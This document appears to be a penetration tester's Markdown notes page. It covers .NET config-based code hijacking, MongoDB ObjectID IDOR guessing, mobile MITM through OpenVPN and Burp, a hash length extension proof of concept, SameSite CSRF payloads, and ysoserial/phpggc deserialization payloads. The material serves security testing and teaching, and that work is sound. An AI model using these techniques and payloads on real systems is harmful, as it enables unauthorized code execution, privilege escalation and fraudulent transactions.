# 📖 Technical hints about specific topics with detailed explanation

> 📡 **Note**: Use the TOC provided by the GitHub MD file rendering named `Outline`.

🏡 [Back to home](README.md).

## UUID explanation and vulnerabilities

> 📡 **Note**:
> This [script](../scripts/identify-uuids.sh) can be used to extract and analyze all UUIDs in a code base and this [script](../scripts/attack-uuidv3v5.py) can be used to attack a UUID v3 or v5 via brute force.

👀 See the following PDF documents:

* [UUID explained n°1](UUID_explained1.pdf)
* [UUID explained n°2](UUID_explained2.pdf)

:dash: `grep` useful command lines related to UUID search and analysis:

```shell
# Extract all UUID from a code base excluding test related files
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | sort -u
320e6aaf-b9d6-4e01-b092-075c29519524
a5268b64-a499-4fff-b8b7-83b9de77db06
ed0a336d-5006-449e-92d6-7b7eb2a2a769
c587b464-2c71-43c7-8bd4-309f2f25ba03
9c3e9fef-f20f-41c2-91a1-d1c2ed3c50a7
b306dbf1-f172-414c-996c-2592ba7d8e38
2aae4edc-bc51-436c-af04-76307825aaa2
...

# Extract all UUID from a code base excluding test related files and display the versions of the UUIDs
$ grep -Por ".*[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}.*" * | grep -iv test | grep -Po "[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}" | cut -d'-' -f3 | cut -c1 | sort -u
1
4
5
```

## TOTP algorithm

> TOTP stands for **T**ime-Based **O**ne-**T**ime **P**assword.

![TOTP_algorithm](TOTP_algorithm2.jpg)

👀 See the following tutorials:

* [How Google Authenticator Works?](TOTP_algorithm1.pdf)
* [security.stackexchange.com post](https://security.stackexchange.com/a/135953) (source of the figure above).

## Hijack .NET app processing flow via its config

* [Demonstration](POCDotNetAppFlowHijackingViaConfig.mp4).
* [Visual Studio project for the assembly](POCDotNetAppFlowHijackingViaConfig-ProjectTemplate.zip).
* [App configuration schema documentation](https://docs.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/).

**Context:**

1. A .NET app run with a more privilege user than my current user like for example a Windows service.
2. This app is installed in a folder in which my current user can create new files.
3. The configuration file associated to the app and, named `[APPNAME].exe.config`, is not present in the folder.
4. The app performs some HTTP/FTP requests.

**Then:**

It is possible to hijack the HTTP/FTP call flow in order to execute custom code, by performing these 2 steps:

1. Create a assembly with a class implementing the interface [System.Net.IWebRequestCreate](https://docs.microsoft.com/en-us/dotnet/api/system.net.iwebrequestcreate?view=net-5.0).
2. Put the custom code in the overrided method named `Create(Uri uri)`. Example of class code:

```csharp
using System;
using System.IO;
using System.Net;
using System.Security.Principal;

namespace ClassLibrary
{
    public class MyModule : IWebRequestCreate
    {
        private string tmpFileName = null;

        public MyModule()
        {
            this.tmpFileName = Path.GetTempPath() + "MyModule.txt";
            string msg = "MyModule::Init::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
        }
        public WebRequest Create(Uri uri)
        {
            string msg = "MyModule::Create::" + WindowsIdentity.GetCurrent().Name;
            TraceCall(msg);
            //Cause a System.NullReferenceException but do not care here...
            return null;
        }

        private void TraceCall(string msg)
        {
            Console.WriteLine(msg);
            if (!File.Exists(tmpFileName))
            {
                using (StreamWriter sw = File.CreateText(tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(this.tmpFileName))
                {
                    sw.WriteLine(msg);
                }
            }
        }
    }
}
```

3. Create a [strong-named configuration](https://docs.microsoft.com/en-us/dotnet/standard/assembly/create-use-strong-named) for the assembly with Visual Studio:

![strong-named configuration](POCDotNetAppFlowHijackingViaConfig.png)

4. Compile and sign the assembly to a dll file: Ensure to match the .NET framework version used by the target application.
5. Copy the assembly dll file in the same folder than the target application.
6. Create the file `[APPNAME].exe.config` in the same folder than the target application with the following block `<webRequestModules>...</webRequestModules>` content (update the assembly info in case of need):

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <!-- ... -->
  <system.net>
    <webRequestModules>
      <!-- Drop all existing defined handler -->
      <clear/>
      <!-- Declare a handler for the FTP protocol using our assembly to execute arbitrary code -->
      <add prefix="ftp" type="ClassLibrary.MyModule, ClassLibrary, Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887"/>
    </webRequestModules>
  </system.net>
</configuration>
```

:speech_balloon: To get the info block `Version=1.0.0.0, Culture=neutral, PublicKeyToken=a4de98bf5421a887` of the assembly, just open the dll file with [DNSpy](https://github.com/dnSpy/dnSpy).

7. Execute the target application: When the app will made any HTTP/FTP request (FTP in the config above) then the code of the assembly will be triggered.

## Inspect java program for attack surfaces

👀 Commands documentation:

* [jdeprscan](https://docs.oracle.com/javase/9/tools/jdeprscan.htm).
* [jdeps](https://docs.oracle.com/javase/9/tools/jdeps.htm).

💻 Collection of commands to leverage:

```shell
# Identify deprecated API elements used by a custom program.
# Provided from JDK 9+.
$ jdeprscan sandbox-1.0-SNAPSHOT.jar
Jar file sandbox-1.0-SNAPSHOT.jar:
class eu/righettod/Sandbox uses deprecated method java/lang/String::getBytes(II[BI)V

# Identify package-level or class-level dependencies for a custom program.
# Provided from JDK 9+.
$ jdeps -v sandbox-1.0-SNAPSHOT.jar
sandbox-1.0-SNAPSHOT.jar -> java.base
   eu.righettod.Sandbox -> java.lang.Exception  java.base
   eu.righettod.Sandbox -> java.lang.Object     java.base
   eu.righettod.Sandbox -> java.lang.String     java.base
```

## Mongo ObjectID and IDOR

> 📡 **Note**: **3.4+** means versions >= 3.4 and **3.2-** means versions <= 3.2.

* [Blog post on the topic](https://www.mickaelwalter.fr/idor-with-mongodb-understanding-objectid/).
* [Explanation about IDOR](https://portswigger.net/web-security/access-control/idor).
* [Tool to generate ObjectID for Mongo DB server 3.4+ format](../scripts/generate-mongodb-potential-object-identifiers.py).
* [Tool to generate ObjectID for Mongo DB server 3.2- format](https://github.com/andresriancho/mongo-objectid-predict) (:warning: it is a python 2 script).

📑 Assuming the following list of gathered Mongo ObjectID - always **12 bytes** length otherwise is not a Mongo ObjectID:

```text
507f1f77bcf86cd7994390af
507f1fc5bcf86cd7994390c4
507f1fdabcf86cd7994390f5
```

📖 ObjectID structure in [Mongo DB Server 3.4+](https://www.mongodb.com/docs/manual/reference/method/ObjectId/) is the following:

1) a **4-byte** timestamp value, representing the **ObjectId**’s creation, measured in seconds since the Unix epoch.
2) a **5-byte** random value generated once per process. This random value is unique to the machine and process.
3) a **3-byte** incrementing counter, initialized to a random value.

ObjectID structure in [Mongo DB server 3.2-](https://docs.mongodb.com/v3.2/reference/method/ObjectId/) is the following:

1) a **4-byte** value representing the seconds since the Unix epoch.
2) a **3-byte** machine identifier.
3) a **2-byte** process id.
4) a **3-byte** counter, starting with a random value.

So, if we try to split ObjectID content by isolating patterns, we obtains the following groups:

```text
507f1f77 bcf86c d799 4390af
507f1fc5 bcf86c d799 4390c4
507f1fda bcf86c d799 4390f5
```

As the block `bcf86c d799` stay stable accross gathered ObjectID then it seems to be a *Machine ID* and a *Process ID*, normally stable in mono instance deployment. So here, the Mongo DB Server seems to be a *3.2-* one.

IDOR here can be tried on parts (bytes) represented with **x**  knowing that the first set of **x** is a timestamp in [epoch](https://en.wikipedia.org/wiki/Unix_time) format: `507f1fxx bcf86c d799 xxxxxx`

For the last set of x (whatever the version of mongo db), there is no need to pass by the decimal representation. Indeed, as the original data is in HEX then the HEX range `a-f0-9` is shorter to evaluate for each of the 3 bytes (assuming that this whole section must be guessed because, initially, it is a counter): `16^6 possibilities for the random part of the ObjectID`

Python code snippet to work with the ObjectID:

```shell
# 507f1f77 bcf86c d799 4390c4
$ python
>>> from datetime import datetime
>>> int("507f1f77", 16)
1350508407
>>> int("4390c4", 16)
4427972
>>> datetime.fromtimestamp(1350508407)
datetime.datetime(2012, 10, 17, 23, 13, 27)
```

## Interacting with a Message Oriented Middleware system

> 💬 IBM MQSERIES is used here as an example because it's the one I often meet.

* [MQSERIES clients](https://www.ibm.com/support/pages/mqc91-ibm-mq-clients)
* [MQSERIES java client api javadoc](https://www.ibm.com/docs/api/v1/content/SSFKSJ_8.0.0/com.ibm.mq.javadoc.doc/WMQJavaClasses/index.html)
* [MQSERIES java code sample](https://github.com/ibm-messaging/mq-dev-samples)
* [MQSERIES free instance](https://developer.ibm.com/tutorials/mq-connect-app-queue-manager-containers/)

The following elements can be used.

💻 For manual inspection, generally to find a way to connect to a queue manager :

* [MOMUtilsMQSeries.java](../templates/MOMUtilsMQSeries.java) (refer to comments for usage).

💻 For common and more larger operation, once connection to a queue manager was obtained:

* [JMS toolbox](https://github.com/jmstoolbox/jmstoolbox)
* [IBM MQ Explorer via a Eclipse extension](http://marketplace.eclipse.org/content/ibm-mq-explorer-version-92)

💡 An utility class to work with an [ActiveMQ broker](../templates/MOMUtilsActiveMQ.java) was added too.

## MITM on a mobile via OpenVPN

* [Documentation 1](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/).
* [Documentation 2](https://www.triskelelabs.com/intercepting-xamarin-mobile-app-traffic-2).

💻 Requirements:

* Debian VM in **Bridge network mode** on an **non-guest isolation Wifi** with Internet access.
  * Packages: `apt install python3 curl wget`.
* Network interface on the VM is named **ens33**.
* Burp CE installed on the VM.

Follow these steps based on the documentation aboves and personal labs:

**On the VM:**

1. Use this [script](https://github.com/Nyr/openvpn-install) to install and later manage OpenVPN instance + client profiles.
    * Use the IP of the VM as **Public IPv4 address**.
    * Use **UDP procol** with **default port** proposed.
    * Use **1.1.1.1** for the DNS server.
    * My client profile was named **mobvpn**.
2. Once installed, export the Burp CA certifcate in **DER format** in the **/root** folder as **burp.crt** file (alongside the client profile file named **mobvpn.ovpn**).
3. Expose the **/root** folder via web via the command: `python3 -m http.server 8080 --directory /root/`

**On the mobile:**

1. Connect the mobile to the same Wifi than the VM.
2. Install the [OpenVPN application](https://apps.apple.com/us/app/openvpn-connect/id590379981).
3. Open the url `http://[VM]:8080/mobvpn.ovpn` in Safari and [open the profile with the OpenVPN application](https://blog.nviso.eu/2020/06/12/intercepting-flutter-traffic-on-ios/) to install it:

![MITMMobileOpenVPN_Profile.png](MITMMobileOpenVPN_Profile.png)

4. Open the url `http://[VM]:8080/burp.crt` in Safari and fully install the profile and trust the Burp CA:

![MITMMobileOpenVPN_BurpCA1.png](MITMMobileOpenVPN_BurpCA1.png) ![MITMMobileOpenVPN_BurpCA2.png](MITMMobileOpenVPN_BurpCA2.png)

**On the VM:**

1. Stop the python listener.
2. Start burp and define it as transparent proxy listening on **port 8888** on **all interfaces** (set **Intercept** button to **off**):

![MITMMobileOpenVPN_BurpProxy1.png](MITMMobileOpenVPN_BurpProxy1.png)

![MITMMobileOpenVPN_BurpProxy2.png](MITMMobileOpenVPN_BurpProxy2.png)

3. Execute the following commands to setup the network redirection:

Replace `192.168.178.0/24` by the Wifi CDIR. Added rules are removed once the VM is restarted.

```bash
iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 80 -j REDIRECT --to-port 8888
iptables -t nat -A PREROUTING -i tun0 -p tcp --dport 443 -j REDIRECT --to-port 8888
iptables -t nat -A POSTROUTING -s 192.168.178.0/24 -o ens33 -j MASQUERADE
sysctl -w net.ipv4.ip_forward=1
sysctl -w net.ipv6.conf.all.forwarding=1
sysctl -w net.ipv4.conf.all.send_redirects=0
iptables -t nat -L
```

**On the mobile:**

In OpenVP application, start the connection and test some HTTP/HTTPS url with Safari to very that interception is OK:

![MITMMobileOpenVPN_FinalTest1.png](MITMMobileOpenVPN_FinalTest1.png)

![MITMMobileOpenVPN_FinalTest2.png](MITMMobileOpenVPN_FinalTest2.png)

## Hash length extension attacks

### Context of the vulnerability

1. An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm,and entrusts the attacker with both the string and the hash, but not the secret.
2. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

📍 If the length of the secret is know then it is better but if it is not the case then can be brute forced.

💡 Hashing algorithms MD2, SHA-224, and SHA-384 are not vulnerable but MD4, MD5, RIPEMD-160, SHA-0, SHA-1, SHA-256, SHA-512, WHIRLPOOL are vulnerable.

### Root cause of the vulnerability

Usage of a simple **hash** to ensure **the integrity** of a protected data.

### Remediation

Use **HMAC** instead of a simple **hash** to create a signature using symmetric secret.

### Vulnerable code sample to show the issue

```php
function sign_payment($payment_infos)
{
    //compute signature to ensure the payment details 
 //cannot be tampered with
    $secret = "577f5742-dc11-48bd-b6e9-ff96fbdf0d92";
    $data = $secret . $payment_infos;
    return hash("sha256", $data);
}

function verify_signature($payment_infos, $payment_signature)
{
    return strcmp(sign_payment($payment_infos),  $payment_signature);
}
```

### Code of demonstration of the problem

```php
$payment_original_infos = "data";
$payment_signature = sign_payment($payment_original_infos);
$payment_signature_verification = verify_signature($payment_original_infos, $payment_signature);
$payment_altered_infos = "data\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x40append";
$payment_altered_signature = "0bd7717d818989b3625f6b3e4c6a9002ed07fb4b943a0704e0fb348a21e1a9f8";
$payment_altered_signature_verification = verify_signature($payment_altered_infos, $payment_altered_signature);

print("payment_original_infos : $payment_original_infos\n");
print("payment_signature      : $payment_signature\n");
if ($payment_signature_verification === 0 && $payment_altered_signature_verification === 0) {
    print("Alteration accepted!\n");
}
```

The value of `$payment_altered_infos` and `$payment_altered_signature` were obtained using the tool [hash_extender](https://github.com/iagox86/hash_extender) via the following command line:

```bash
# Options used:
# --data: The original string that we're going to extend.
# -s: The original signature.
# -a: The data to append to the string
# -l: The length of the secret
# -f: The hash_type of the signature
# --out-data-format: Output data format
$ hash_extender --data "data" -s "f77f59bb37ec13a961dd1f5abe289dd8f7b6ae664b97a5d64c6c625f7dacea58" -a "append" -l 36 -f sha256 --out-data-format=cstr
    Type: sha256     
    Secret length: 36
    New signature: 0bd7717d818989b3625f6b3e4c6a9002ed07fb4b943a0704e0fb348a21e1a9f8
    New string: data\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x40append
```

Execution of the POC:

```bash
$ php test.php 
payment_original_infos : data
payment_signature      : f77f59bb37ec13a961dd1f5abe289dd8f7b6ae664b97a5d64c6c625f7dacea58
Alteration accepted!
```

### Sources

Primary (best one):

* <https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks>

Additional:

* <https://en.wikipedia.org/wiki/Length_extension_attack>
* <https://www.slideshare.net/exploresecurity/hash-length-extension-attacks>
* <https://d0nut.medium.com/week-17-hash-length-extensions-7f7e02e62fb5>

### Exploitation tool

> 📡 **Note**: Latest Linux binary of the **hash_extender** tool is build every day, via this [workflow](https://github.com/righettod/toolbox-pentest-web/actions/workflows/build_hash_extender_binary.yml), and built content is attached to the build.

* Main: <https://github.com/iagox86/hash_extender>

## SameSite cookie specificities

> 📡 **Note**: Tips below are taken from the [PortSwigger CSRF online course](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions).

💡 In the context of *SameSite cookie restrictions*, a site is defined as the `Top-Level Domain` (**TLD**), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the **TLD+1**.

💡 You may come across the term `effective Top-Level Domain` (**eTLD**). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as `.co.uk`.

### When LAX policy is applied

* As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. The following is one of the simplest approaches to launching such an attack:

```html
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

* Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

💡 You can use this [dictionary](https://github.com/PortSwigger/param-miner/blob/master/resources/params) for a list of possible parameter names.

* Cookies with `SameSite=Lax` restrictions aren't normally sent in any cross-site POST requests, but there are some exceptions. To avoid breaking single sign-on (SSO) mechanisms, **Chrome** doesn't actually enforce these restrictions **at all for the first 120 seconds after a cookie is set**. As a result, there is a two-minute window in which users may be susceptible to cross-site attacks. The following code can be used to cause a *top-level navigation*, which ensures that the cookies associated with their current session are included:

```javascript
//This way, the window.open() method is only invoked when the user clicks somewhere on the page.
//As this is the result of a manual interaction, the browser allows the popup. 
window.onclick = () => { window.open('https://vulnerable-website.com/path-issuing-target-cookie'); }
```

### When STRICT policy is applied

* If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site like for example a DOM based open redirect.
* Whether you're testing someone else's website or trying to secure your own, it's essential to keep in mind that a request can still be same-site even if it's issued cross-origin. It is the case for sibling domains:
  * A cookie set by a response from `https://app.example.com` will be send for a request to `https://intranet.example.com` because they are both considered Same-Site.

## Debug a DotNet web app with DNSpy

💻 Debug instruction:

```csharp
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
```

💻 Procedure:

1. Using DNSpy: Add the **debug instruction** to the target assembly in the app install directory and save the assembly module.
2. Remove the assembly from DNSpy
3. Restart IIS via `iisreset /noforce` to ensure that the assembly will be copied by the worker in its working folder.
4. Access the application home page in order to instruct IIS to initiate a worker.
5. Using DNSpy: Open the assembly file from the worker working folder.
6. Using DNSpy: Attach to the process *w3wp.exe* (IIS worker process) via *Debug > Attach to Process...* menu.
7. Using DNSpy: Pause (*Break All*) the debugging.
8. Using DNSpy: Open all module via *Debug > Windows > Modules* menu, right-click on a module and click on *Open All Modules*.
9. Using DNSpy: Choose a location and set a breakpoint.
10. Using DNSpy: Click on *Continue* to resume the debugging.
11. Access the application to trigger the breakpoint.

## Debug a Python web app with VSCode

### Step 1

💻 Add the following code in the starting point of the application as first statement before the application start in order to start it allowing to attach a debugger to it:

:information_source: [PTVSD documentation](https://github.com/microsoft/ptvsd)

```python
###### Start the debugger on port 5678
## Dependency: pip install ptvsd
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################
```

💻 Example in a Flask application:

```python
from flask import Flask, request

###### Start the debugger on port 5678
import ptvsd
ptvsd.enable_attach(redirect_output=True)
print("Now ready for the IDE to connect to the debugger on port 5678")
ptvsd.wait_for_attach()
#########################################################################

app = Flask(__name__)

@app.route('/', methods=['GET'])
def call():
    print("[+] Call")
    return "OK"
 
app.run(host='0.0.0.0', port=8000)
```

### Step 2

💻 In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

:warning: Adjust the **remoteRoot** attribute to the target deployment absolute folder path!

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Python Remote Attach To Debugger",
            "type": "python",
            "request": "attach",
            "connect": {
                "host": "10.10.10.10",
                "port": 5678
            },
            "pathMappings": [
                {
                    "localRoot": "${workspaceFolder}",
                    "remoteRoot": "."
                }
            ]
        }
    ]
}
```

### Step 3

1. Run the application on the server.
2. Launch the debug configuration in VSCode.
3. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

:triangular_flag_on_post: If the error `Only one usage of each socket address (protocol/network address/port) is normally permitted` is raised during the start of the app then change the attach port via the following syntax:

```python
ptvsd.enable_attach(address=("10.10.10.10", 8200), redirect_output=True)
```

## Debug a NodeJS web app with VSCode

### Step 1

💻 Start application in debug mode:

:information_source: [Command line options for the debug mode](https://nodejs.org/api/cli.html)

```shell
$ node --inspect=10.10.10.10:9229 app.js
Debugger listening on ws://10.10.10.10:9229/dbc78b68-7d9d-46e6-b501-b3110dd6c04d
For help, see: https://nodejs.org/en/docs/inspector
```

### Step 2

:information_source: [Remote debugging configuration options](https://code.visualstudio.com/docs/nodejs/nodejs-debugging#_remote-debugging)

:information_source: Notes about the `localRoot` and `remoteRoot` configuration options taken from the link above:

> By default, VSCode will stream the debugged source from the remote Node.js folder to the local VSCode and show it in a **read-only** editor.

> You can step through this code, but cannot modify it. If you want VSCode to open the editable source from your workspace instead, you can setup a mapping between the remote and local locations.

> A `localRoot` and a `remoteRoot` attribute can be used to map paths between a local VSCode project and a (remote) Node.js folder. This works even locally on the same system or across different operating systems. Whenever a code path needs to be converted from the remote Node.js folder to a local VS Code path, the `remoteRoot` path is stripped off the path and replaced by `localRoot`. For the reverse conversion, the `localRoot` path is replaced by the `remoteRoot`.

💡 Use the `"localRoot": "${workspaceFolder}"` option to point local sources to the workspace location.

💻 In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "address": "10.10.10.10",
            "name": "NodeJS Remote Attach To Debugger",
            "port": 9229,
            "request": "attach",
            "skipFiles": [
                "<node_internals>/**"
            ],
            "type": "pwa-node"
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. If all goes well, the debugger will be attached and breakpoint can be created/triggered.

## Debug a PHP web app with VSCode

### Step 1

:information_source: [XDebug documentation](https://xdebug.org/docs/install)

:triangular_flag_on_post: In this debug mode, it's XDebug that will connect back to the debug listener started by VSCode when a PHP remote script is called.

:warning: Ensure that the following lines are present into the `php.ini` configuration file used by the server in order to ensure that XDebug is installed/configured:

```ini
; ...
zend_extension = [FULL_PATH_TO_THE_XDEBUG_LIBRARY_SO_OR_DLL_FILE]
; ...
[XDebug]
xdebug.remote_enable = true
xdebug.remote_autostart = true
xdebug.remote_connect_back = true
xdebug.remote_port = 8000
```

### Step 2

:warning: Adjust the `[REMOTE_ROOT]` marker to the target deployment absolute folder path!

:warning: Ensure that the server can connect to the IP/PORT specified in the `php.ini` file as well as the VSCode debug configuration!

1. Install the VSCode extension *[PHP Debug](https://marketplace.visualstudio.com/items?itemName=felixfbecker.php-debug)*.
2. In the VSCode project, add the following content in the file `.vscode/launch.json` to define the *run and debug* configuration:

```json
{
    "version": "0.2.0",
    "configurations": [
        {
            "name": "Listen for XDebug incoming connection",
            "type": "php",
            "request": "launch",
            "hostname": "10.10.10.10",
            "port": 8000,
            "log": true,
            "pathMappings": {
                "[REMOTE_ROOT]": "${workspaceRoot}"
              }
        }
    ]
}
```

### Step 3

1. Launch the debug configuration in VSCode.
2. Set a breakpoint.
3. Call the remote PHP script via the browser or a HTTP client.
4. If all goes well, the  breakpoint will be triggered.

## PHP Type Juggling

* [Explanation 1](PHP_type_juggling.pdf)
* [Documentation](http://php.net/manual/en/language.types.string.php#language.types.string.conversion)
* [Magic hashes](https://github.com/spaze/hashes)

**String conversion to numbers rules:**

> When a string is evaluated in a numeric context, the resulting value and type are determined as follows.

> If the string does not contain any of the characters `.`, `e`, or `E` and the numeric value fits into integer type limits (as defined by PHP_INT_MAX), the string will be evaluated as an int. In all other cases it will be evaluated as a float.

> The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.

Example:

```php
//PHP 7.3.4 (cli)
//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 0
var_dump('0'==0); //bool(true)
var_dump('0xxxxx'==0);//bool(true)
var_dump('0e123'==0);//bool(true)
var_dump('0eABCD'==0);//bool(true)
var_dump('000e123'==0);//bool(true)
var_dump('000eABCD'==0);//bool(true)
var_dump('000E123'==0);//bool(true)
var_dump('000EABCD'==0);//bool(true)

//All expressions below returns true because the PHP engine convert
//the left string provided expression to a integer with the value 10
var_dump('010'==10);//bool(true)
var_dump('010xxx'==10);//bool(true)
```

## JSON parser issue advanced tests

* [Source](https://labs.bishopfox.com/tech-blog/an-exploration-of-json-interoperability-vulnerabilities).

### Inconsistent Duplicate Key Precedence

Sample:

```json
obj = {"test": 1, "test": 2}
```

### Key Collision: Character Truncation and Comments

#### Using Character Truncation

💡 Some parsers truncate particular characters when they appear in a string.

💻 Sample:

```json
{"test": 1, "test\[raw \x0d byte]": 2} 
{"test": 1, "test\ud800": 2}
{"test": 1, "test"": 2}
{"test": 1, "te\st": 2}
```

#### Using Comment Truncation

💡 Many JSON libraries support quoteless strings and comment syntax from JavaScript interpreter environments (e.g., `/*`, `*/`).

💻 Sample:

```json
obj = {"test": valWithoutQuotes, keyWithoutQuotes: "test" /* Comment support */}
obj = {"description": "Duplicate with comments", "test": 2, "extra": /*, "test": 1, "extra2": */}
```

### Float and Integer Representation

#### Inconsistent Large Number Decoding

💡 When not decoded accurately, large numbers may be decoded as *MAX_INT* or 0 (or *MIN_INT* as we approach negative infinity).

💻 Sample:

```text
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
```

#### Inconsistent Type Representation with Infinity

💡 Positive and negative infinity along with NaN (not a number) are not supported by the official RFC. But many parsers have chosen workarounds.

💻 Sample:

```json
{"description": "Big float", "test": 1.0e4096}
```

### Permissive Parsing and One-off Bugs

#### Trailing Garbage

💡 Allowing trailing garbage is a well-known issue with many JSON parsers that has been misused for many years to conduct cross-site request forgery (CSRF) attacks.

👀 To bypass same-origin policy (SOP) "simple request" limitations, a JSON document can be posted with a trailing equals sign to suggest a `x-form-urlencoded` document, which is permitted in cross-origin requests.

💻 Sample:

```json
{"test": 1}=
```

#### Denial-of-Service: Segmentation Faults

💡 Can happen when libraries crashed on malformed JSON or when libraries use low-level routines that may be susceptible to memory safety issue.

## URL vs URI vs URN

![URstar](URL_description.jpg)

## Deserialization issue exploitation

### Identity serialization processing in code base

👀 Search for the following strings.

#### Java

```
ObjectInputStream
readObject
```

#### .NET

```
ISerializable
Deserialize
Serialize
```

#### PHP

```
serialize
unserialize
```

#### Python

```
pickle
dumps
loads
```

### When YSOSERIAL for .NET is used

#### Different modes used

[Documentation](https://docs.microsoft.com/en-us/dotnet/standard/serialization) about the different modes used: JSON / Binary / XML.

#### Format of the .NET assembly-qualified name

[Documentation](https://docs.microsoft.com/en-us/dotnet/api/system.type.assemblyqualifiedname)

💻 Example: `System.Globalization.NumberFormatInfo, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089`

🤔 Parts separated by a comma:

1. Namespace (`System.Globalization`) + `.` + Classname (`NumberFormatInfo`)
2. Display name of the assembly obtained using the `Assembly.FullName` property
3. Version of the assembly
4. Culture of the assembly
5. Optional PublicKeyToken (can be set to null)

### When YSOSERIAL is used

> 📡 **Note**:
> This [script](../scripts/identify-potential-payloads.sh) can be used to perform a static analysis of the different libraries (JAR files) used by an application in order to identify potentials applicable YSOSERIAL payloads.

💻 PowerShell break the binary content when sending it to a file using the `>` instruction like this:

```powershell
PS> java -jar ysoserial.jar Groovy1 calc.exe > payload.bin
```  

💻 Use a normal shell (MSDOS) to generate the payload binary file and ensure that the HEX content start with **aced** or the Base64 content start with **rO0**.

💻 Use the following Linux command to encode the binary payload in Base64:

```shell
cat payload.bin | base64 -w 0 > payload-encoded.txt
```

### When PHPGGC is used

📍 Always use the option:

* `-s` to prevent any issue with non-printable characters.
* `-f` when the magic method used by the kick-off gadget (called vector in PHPGGC) is *__destruct*.

💻 Example:

```shell
$ php phpggc -f "Symfony/RCE4" "system" "id"
a:2:{i:7;O:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"Symfony\Component\Cache\Adapter\TagAwareAdapterdeferred";a:1:{i:0;O:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"*poolHash";i:1;s:12:"*innerItem";s:2:"id";}}s:53:"Symfony\Component\Cache\Adapter\TagAwareAdapterpool";O:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"Symfony\Component\Cache\Adapter\ProxyAdapterpoolHash";i:1;s:58:"Symfony\Component\Cache\Adapter\ProxyAdaptersetInnerItem";s:6:"system";}}i:7;i:7;}

$ php phpggc -s -f "Symfony/RCE4" "system" "id"
a:2:{i:7%3BO:47:"Symfony\Component\Cache\Adapter\TagAwareAdapter":2:{s:57:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00deferred"%3Ba:1:{i:0%3BO:33:"Symfony\Component\Cache\CacheItem":2:{s:11:"%00*%00poolHash"%3Bi:1%3Bs:12:"%00*%00innerItem"%3Bs:2:"id"%3B}}s:53:"%00Symfony\Component\Cache\Adapter\TagAwareAdapter%00pool"%3BO:44:"Symfony\Component\Cache\Adapter\ProxyAdapter":2:{s:54:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00poolHash"%3Bi:1%3Bs:58:"%00Symfony\Component\Cache\Adapter\ProxyAdapter%00setInnerItem"%3Bs:6:"system"%3B}}i:7%3Bi:7%3B}
```

### When Python is used

💡 If the decoded element start by `\x80\x03` or `\x80\x04` then try to load it via [Pickle](https://docs.python.org/3/library/pickle.html) because it seems to be a serialized object:

```text
# Test on Linux
Python 3.8.2 - [GCC 9.3.0] on linux
>>> import pickle
>>> print(pickle.dumps("TEST"))
b'\x80\x04\x95\x08\x00\x00\x00\x00\x00\x00\x00\x8c\x04TEST\x94.'
